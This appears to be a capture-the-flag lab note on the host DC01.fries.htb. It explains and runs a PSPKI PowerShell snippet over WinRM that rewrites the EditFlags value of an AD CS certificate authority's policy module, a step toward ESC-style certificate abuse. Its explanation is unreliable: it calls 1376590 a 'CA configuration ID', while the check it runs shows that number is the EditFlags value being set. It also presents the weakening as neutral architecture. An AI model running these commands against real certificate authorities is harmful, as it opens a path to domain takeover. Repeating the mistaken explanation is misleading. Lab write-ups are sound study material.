The following code is a **CA registry‑level modification** using PSPKI’s DCOM interface — and it’s important to understand exactly what this code _does_ so you can reason about it safely and architecturally.

## 🧩 What This PowerShell Snippet Actually Does

### 1. **Loads PSPKI**

```
Import-Module PSPKI
```

This gives you access to advanced AD CS management cmdlets and .NET classes.

### 2. **Creates a DCOM Registry Manager for the CA**


```
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
```

This object allows remote editing of the CA’s internal configuration stored under:


```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>\
```

This is **not** the same as editing certificate templates — this is modifying the CA’s own policy module settings.

### 3. **Sets the Root Node**

```
$configReader.SetRootNode($true)
```

This tells the manager to operate at the CA’s root configuration level.

### 4. **Modifies a CA Policy Module Registry Value**

Code

```
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

This is the key part.

 ✔ `1376590`

This is the **CA configuration ID** (an internal numeric handle PSPKI uses).

 ✔ `"EditFlags"`

This is a registry value under the CA’s policy module key. `EditFlags` controls **how the CA handles certificate requests**, including:

- Whether subject names can be supplied by the requester
    
- Whether the CA enforces certain issuance requirements
    
- Whether the CA allows custom extensions
    
- Whether the CA honors template settings strictly
    

These flags directly affect **ESC1/ESC3‑style vulnerabilities** if misconfigured.

✔ `"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"`

This is the path to the **default policy module**, which governs how the CA evaluates certificate requests.

## 🧭 What This Means Architecturally

You are **not** modifying a certificate template here.

You are modifying the **CA’s policy behavior**, which affects _all_ templates the CA issues.

This is the layer where:

- Subject name enforcement
    
- EKU validation
    
- Request restrictions
    
- Issuance rules
    

…are applied.

If you weaken `EditFlags`, you can unintentionally create or amplify ESC vulnerabilities.

If you strengthen them, you can harden the CA.

## 🧱 Why This Matters for Your Documentation

This is a perfect example of the layered PKI architecture you’ve been mapping:

|Layer|Component|Purpose|
|---|---|---|
|**Template Layer**|Certificate Templates|Define what a certificate _should_ look like|
|**CA Policy Layer**|Policy Module (`EditFlags`)|Enforces or overrides template rules|
|**CA Engine Layer**|CertSvc|Issues certificates|
|**Directory Layer**|AD DS|Stores templates and permissions|

This snippet operates at the **CA Policy Layer**, which sits _above_ templates and can override them.

---

## Running

#WinRM_Shell
Run the followng code.

```
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Run the following code to ask the CA:

```
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

**“What is the current value of the** `EditFlags` **registry entry under the Microsoft Default Policy module?”**

This corresponds to the registry path:

```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
```

PSPKI abstracts that into a DCOM call instead of direct registry access.

Result: *1376590*.

**Next step:** [[Enable ESC16 to Disable Security]]